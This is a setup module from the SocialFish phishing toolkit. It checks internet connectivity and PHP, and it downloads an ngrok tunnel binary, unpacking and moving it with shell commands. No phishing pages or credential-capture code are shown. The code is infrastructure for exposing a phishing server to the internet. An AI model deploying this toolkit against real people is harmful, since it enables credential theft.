######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from wget import download
from os import system, path
from platform import system as systemos, architecture
from subprocess import check_output
from urllib.request import urlopen
from core.view import *

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False

def checkNgrok():
    if path.isfile('base/Server/ngrok') == False: 
        print('[*] Downloading Ngrok...')
        if 'Android' in str(check_output(('uname', '-a'))):
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            ostype = systemos().lower()
            if architecture()[0] == '64bit':
                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
            else:
                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok base/Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')

def checkPHP():
    if 256 != system('which php'):
        return True        
    else:
        return False
 
def pre():
    checkNgrok()
    if connected() == False:
        conNot()       
    if checkPHP() == False:
        phpNot()     
